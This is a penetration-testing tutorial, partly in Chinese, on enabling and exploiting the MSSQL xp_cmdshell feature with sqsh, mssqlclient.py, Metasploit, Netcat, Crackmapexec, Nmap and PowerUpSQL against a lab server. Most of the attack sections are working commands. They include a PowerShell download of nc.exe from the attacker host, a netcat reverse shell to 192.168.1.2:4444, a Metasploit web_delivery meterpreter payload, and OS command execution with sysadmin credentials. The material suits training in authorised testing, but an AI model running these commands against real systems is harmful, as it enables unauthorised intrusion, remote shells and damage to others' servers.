今天的文章是MSSQL Server及其渗透测试系列的第三篇文章。在本文中，我们将发现和利用xp_cmdshell功能的安全方面。
### 目录

-   **介绍**
    -   什么是xp_cmdshell？
-   **启用 xp_cmdshell**
    -   Manually (GUI)
    -   sqsh
    -   mssqlclient.py
    -   Metasploit
-   **Exploiting xp_cmdshell:**
    -   Metasploit
    -   Netcat
    -   Crackmapexec
    -   Nmap
    -   PowerUpSQL
-   **总结**

### 介绍

本文中的所有演示都将在MSSQL Server上呈现。要设置MS-SQL服务器，详情可见我们的文章：**[渗透测试实验室设置：MS-SQL]（https://www.hackingarticles.in/penetration-testing-lab-setupms-sql/）**。之前，我们在文章中简要讨论了借助Metasploit模块利用xp_cmdshell功能：利用/windows/mssql/mssql_payload：**[MSSQL渗透测试与Metasploit]（https://www.hackingarticles.in/mssql-for-pentester-metasploit/）**。尽管在那篇文章中，我们没有解释xp_cmdshell功能的背景及其安全方面，我们将讨论这些。

**xp_cmdshell是什么？**

根据微软官方文档，xp_cmdshell是一个生成Windows命令外壳并传递字符串以供执行的功能。它生成的任何输出都以文本行的格式显示。为了简化，我们可以说它允许数据库管理员直接从SQL服务器访问和执行任何外部进程。xp_cmdshell的实现可以追溯到SQLServer 6.5。它旨在使用系统命令的SQL查询来自动化需要额外编程和工作的各种任务。现在我们有了一些关于xp_cmdshell的知识，我们可以看到如何在SQL服务器上启用它。
### Enabling xp_cmdshell

**Manually (GUI)**

By default, the function of xp_cmdshell is disabled in the SQL server. We need to have administrator privileges to enable it. In the demonstration below, we are using the credentials of the SA user to log in on the SQL server.

.![](https://i0.wp.com/1.bp.blogspot.com/-jZmEwGQj7NY/YR_oHES71XI/AAAAAAAAyOM/nL-DR9z8Pm4W0H2Le_pi3jMgK6f4cErUACLcBGAsYHQ/s16000/1.png?w=640&ssl=1)

Now that we have the SQL instance running as Administrator, we need to access the Object Explorer section. Here, we have the SQL Server Instance; we right-click on the instance to find a drop-down menu. We need to choose the “**Facets**” option from this menu, as demonstrated below:

![](https://i0.wp.com/1.bp.blogspot.com/-jp6EO8S8Ptg/YR_oOiAwMjI/AAAAAAAAyOQ/6o7rwysTcZA3JDVVOCUo6lAP6fTGwi-nwCLcBGAsYHQ/s16000/2.png?w=640&ssl=1)

Clicking on the Facets option will open a new window. It will have a field with the various types of facets available. We need to choose the Surface Area Configuration facets from the drop-down menu, as shown in the image below:

![](https://i0.wp.com/1.bp.blogspot.com/-WTi7O9cEQE4/YR_oS7Cz5UI/AAAAAAAAyOU/TW97GiaeRY0SZC9RNFBAcKywAXgWuxcowCLcBGAsYHQ/s16000/3.png?w=640&ssl=1)

After choosing the surface area configuration facet, we see that we have the XPCmdShellEnabled option set as false.

![](https://i0.wp.com/1.bp.blogspot.com/-5c_Rmigopgw/YR_oWlNppRI/AAAAAAAAyOc/B2-atvcJppsaj3Gec8yP00U2kBoxNfzBQCLcBGAsYHQ/s16000/4.png?w=640&ssl=1)

Clicking on the XP command shell option, we change its value from false to true, as shown in the figure below. This way, we can enable XP command shell using the graphical user interface on a Windows MSSQL Server.

![](https://i0.wp.com/1.bp.blogspot.com/-jKZoS1vbwjU/YR_oa0uBz6I/AAAAAAAAyOg/KpLCEWf3WCg6YkvvsVf-6eYVhB_XeJCVgCLcBGAsYHQ/s16000/5.png?w=640&ssl=1)

**sqsh**

Next, we are using the **sqsh** tool in the kali machine. To check whether the. XP command shell option is enabled on the target machine or not. The syntax for using this tool is quite simple, first type sqsh with the -S and the Target IP address followed by -U with the username of the server admin and -P with the password for that particular user as shown in the image below.

sqsh -S 192.168.1.146 -U sa -P "Password@1"

xp_cmdshell 'whoami';

go

**![](https://i0.wp.com/1.bp.blogspot.com/--eaH4DMkm3E/YR_og4hKpGI/AAAAAAAAyOk/2hRG26Zfde4nBTSyb6s8zQ1Y5KGDNZuEwCLcBGAsYHQ/s16000/10.png?w=640&ssl=1)**

As we can observe from the image, the SQL Server had blocked access to the procedure command shell; therefore, we will enable it now. To enable the XP command shell on the target machine using SQSH we will be running a series of commands that would first show the advanced options available within the SP configuration option. Then we will choose to execute the XP command shell option and activate it. Finally, we will run the reconfigure command that will enable the XP commercial option on the target machine, as shown in the image given below.

EXEC sp_configure 'show advanced options', 1;

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;

go

xp_cmdshell 'whoami';

go

![](https://i0.wp.com/1.bp.blogspot.com/-ah3O7A7JVDg/YR_op5cM8PI/AAAAAAAAyOs/j3g35b4ZMC0leiIJ3GtzeR5BWD2GUz8SACLcBGAsYHQ/s16000/11.png?w=640&ssl=1)

The activity can be verified by checking similarly to what we did with the GUI option as before.

![](https://i0.wp.com/1.bp.blogspot.com/-52TZQevcisU/YR_ougJr_gI/AAAAAAAAyO0/LYZybnNHv9EHRm8502Z6s2WT6391b7RhwCLcBGAsYHQ/s16000/12.png?w=640&ssl=1)

**mssqlclient.py**

MS SQL consists of windows services having service accounts. Whenever an instance of SQLserver is installed, a set of Windows services is also installed with unique names. Below are the SQL Server account types:

-   Windows Accounts
-   SQL Server Login
-   DB Users

To use mssqlclient.py, we need to specify the username, domain, password, the target IP address, and the Port hosting the MSSQL service as shown in the image. here we can use the command **enable_xp_cmdshell** to enable command shell functionality on the target machine.

python3 mssqlclient.py WORKGROUP/sa:Password@1@192.168.1.146 -port 1433

enable_xp_cmdshell

![](https://i0.wp.com/1.bp.blogspot.com/-Y1dj1nlrdYY/YR_oy-XcnyI/AAAAAAAAyO8/RYrBZRhwmGIa2x78VX1qFj148_myFlofwCLcBGAsYHQ/s16000/13.png?w=640&ssl=1)

Again, we can verify it similarly to what we did with the GUI approach and the sqsh approach. Here we can see that we were able to enable the XP command shell functionality with the help of mssqlclient, which is a part of the Impact toolkit.

![](https://i0.wp.com/1.bp.blogspot.com/-ry0CY6INxgU/YR_pGtrGXVI/AAAAAAAAyPQ/7V645vMDCSIuZMfKnc4-O6pNXpdVe3DCQCLcBGAsYHQ/s16000/14.png?w=640&ssl=1)

Previously, mssqlclient.py is used to connect the database through database credentials having username **SA**. Now we are connecting with the database by window’s user login credential.

![](https://i0.wp.com/1.bp.blogspot.com/-bOxgpXApafc/YR_uro2sLMI/AAAAAAAAyQ0/Z7z-69Bh6pwRUiHp5dG8S6y08ArwQgJrACLcBGAsYHQ/s16000/15.png?w=640&ssl=1)

python3 mssqlclient.py ignite:'Password@123'@192.168.1.146 -windows-auth

enable_xp_cmdshell

![](https://i0.wp.com/1.bp.blogspot.com/-6VXI6F3fGeo/YR_pU5eDQkI/AAAAAAAAyPY/zBVodOYdYMIrVuaoR1TRe9lknSuHhHbVACLcBGAsYHQ/s16000/16.png?w=640&ssl=1)

**Metasploit**

As usual, Metasploit also plays its role to enable the XP command shell and helps us exploit the target and provide the session.

use exploit/windows/mssql/mssql_payload

set rhosts 192.168.1.146

set password Password@1

exploit

![](https://i0.wp.com/1.bp.blogspot.com/-mYMbcfn_VEk/YR_piH8xHFI/AAAAAAAAyPg/bs44rRpMr647TghZ3-axu8WD5kZ3r9VCgCLcBGAsYHQ/s16000/20.png?w=640&ssl=1)

The exploit does not stop at just enabling the XP command shell. It then runs a series of commands that can help to get us a meterpreter shell on the target machine as shown in the image below

![](https://i0.wp.com/1.bp.blogspot.com/-QfTfLnZCCX0/YR_pqonM_OI/AAAAAAAAyPo/QKi1frc7440WFLHOXg2eQdlaUOk9aR7CgCLcBGAsYHQ/s16000/21.png?w=640&ssl=1)

### Exploiting xp_cmdshell

**Metasploit**

You can use another exploit mssql_exec, which primarily enables the xp_cmd shell, and we can also set any cmd executable command. Here we set the cmd command to “**ipconfig**“ 

use auxiliary/admin/mssql/mssql_exec

set rhosts 192.168.1.146

set password Password@1

set cmd "ipconfig"

exploit

![](https://i0.wp.com/1.bp.blogspot.com/-y4TYgy-AyH4/YR_pv3uAFNI/AAAAAAAAyPs/R2pdKhHn9IgEf0FJfQ0ujb277YE0Qe_ngCLcBGAsYHQ/s16000/22.png?w=640&ssl=1)

**Netcat**

Here, we can use netcat to get a reverse connection on the target machine. To do so, we first need to transfer the netcat binary file to the Windows machine. For this, we will use the nc.exe executable. This file is located at **/usr/share/windows-binaries.** Then we can use the Python one-liner to create an HTTP service.

cd /usr/share/windows-binaries

ls -al

python -m SimpleHTTPServer 80

![](https://i0.wp.com/1.bp.blogspot.com/-Z9LefqgpLJE/YR_p1nURgJI/AAAAAAAAyPw/I2lTxfxsB0k8rxscpFy04mSyGfw5RkoPwCLcBGAsYHQ/s16000/30.png?w=640&ssl=1)

Here, the powershell.exe cmdlet invokes PowerShell and then uses the wget command to download netcat into the **C:/Users/Public** directory, which has access to write. Then we will use the XP command shell to execute the netcat binary to run cmd.exe. To the creating a reverse connection to the host Kali Machine on Port 4444.

xp_cmdshell "powershell.exe wget http://192.168.1.2/nc.exe -OutFile c:\\Users\Public\\nc.exe"

xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.1.2 4444"

![](https://i0.wp.com/1.bp.blogspot.com/-mWlHw8tp3Uo/YR_p6A4AIEI/AAAAAAAAyP0/pikp__CUTNk-7E228CeWATBqdo----EpQCLcBGAsYHQ/s16000/31.png?w=640&ssl=1)

In Kali Linux, we have a netcat listener on port 4444; once the PowerShell command will execute as shown in the above screenshot, we will get the shell of the target machine.

nc -lvp 4444

whoami

                                      ![](https://i0.wp.com/1.bp.blogspot.com/-vpUE11Ic9iI/YR_qFUvb05I/AAAAAAAAyQA/MgZDMCYAmTcVHDYuNPKOWdRanJRHOdvkACLcBGAsYHQ/s16000/32.png?w=640&ssl=1)

**Crackmapexec**

Another method to get a reverse connection on the target machine from the MSSQL XP command Shell functionality is by using its ability to run system commands associated with the web_delivery payload. The process is quite simple; we use the exploit/multi/script/web_delivery exploit, set the target as the Windows machine then set the payload as windows/meterpeter/reverse_tcp. Then specify the localhost. Finally, we will run the exploit command.

use exploit/multi/script/web_delivery

set target 2

set payload windows/meterpreter/revese_tcp

set lhost 192.168.1.2

exploit

![](https://i0.wp.com/1.bp.blogspot.com/-P-mTOE2P53c/YR_qOGA6iqI/AAAAAAAAyQI/IZAaD6iLWAsiEhyuMm8rPFw60OwKaKgPQCLcBGAsYHQ/s16000/45.png?w=640&ssl=1)

Through the above exploit, we get the web_delivery URL, and this URL  we will use in the execution of crackmapexec, command of web_delivery.

crackmapexec mssql 192.168.1.146 -u 'ignite' -p 'Password@123' -M web_delivery -o URL=http://192.168.1.2:8080/om6cxs3B

![](https://i0.wp.com/1.bp.blogspot.com/-YLsEnBOpGig/YR_qTW6K6yI/AAAAAAAAyQM/vj8_ZMBiUMAhOtmgzmFycX9mF04ZzlH-gCLcBGAsYHQ/s16000/46.png?w=640&ssl=1)

The output of the crackmapexec shows that the target has been pwned. We can go back to the Metasploit shell and find that the target has been exploited successfully, and we have a meterpreter shell on the target machine.

![](https://i0.wp.com/1.bp.blogspot.com/-M8m6w6AYZ4Y/YR_qXBsBngI/AAAAAAAAyQU/HtUdlhbFTGgl7-818ZLMtPFVB76dLgIYgCLcBGAsYHQ/s16000/47.png?w=640&ssl=1)

**Nmap**

As we know, the XP-cmd function is disabled by default, but if we have sysadmin credentials, we can also play with the NMap script to execute the window’s commands.

nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.passsword=Password@1,ms-sql-xp-cmdshell.cmd=’net user’ 192.168.1.146

![](https://i0.wp.com/1.bp.blogspot.com/-HhI0NPmilbY/YR_qcM9n1FI/AAAAAAAAyQY/SqWKR3Z3OrUp09SWW9pIC7B_1ql5ZOjSQCLcBGAsYHQ/s16000/48.png?w=640&ssl=1)

**PowerUpSQL**

First, Download the PowerUpSql from **[here.](https://github.com/NetSPI/PowerUpSQL)**  PowerUpSQL is a tool for Windows machines, includes functions that support SQL Server discovery, weak configuration auditing, privilege escalation on the scale, and post-exploitation actions such as OS command execution.

We can use the Import-Module cmdlet to import the PowerShell Script. Then use the Invoke-SQLOSCmd function, which runs the OS commands via xp_cmd shell through the SQL service account.

Here, PowerUpSQL tries to connect with the database. After the connection is successful, it checks if the user credentials that we have provided are for sysadmin or the users that we have provided have sysadmin access or not. It first enables the advanced options and then tries to enable the XP command shell functionality. Here, in this demonstration, the XP commands functionality is already enabled, so the tool runs the **whoami** command, which shows that we are the user and nt service/MSSQL$sqlexpress user.

cd PowerUPSQL-master

powershell

powershell -ep bypass

Import-Module .\PowerUpSQL.ps1

Invoke-SQLOSCmd -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS –Command whoami –Verbose

![](https://i0.wp.com/1.bp.blogspot.com/-kN3UTEONcgQ/YR_q63mDkyI/AAAAAAAAyQs/b4BbISjwmuQmY6up2h4jQxhXo1lo7-H4gCLcBGAsYHQ/s16000/50.png?w=640&ssl=1)

### Conclusion

This article was designed to provide the users with possible content that can help them whenever they want to perform penetration testing on MSSQL Servers by exploiting XP command shell functionality. The point of this article is not to speculate on how the user can get the credentials or how they were able to elevate its sysadmin access. Instead, when or if the user could get those privileges, they can move on to extract and execute multiple commands on the target system and do more damage.

**Author: Pavandeep Singh** is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on **[Twitter](https://twitter.com/pavan2318)** and **[LinkedIn](https://www.linkedin.com/in/pavan2318/)**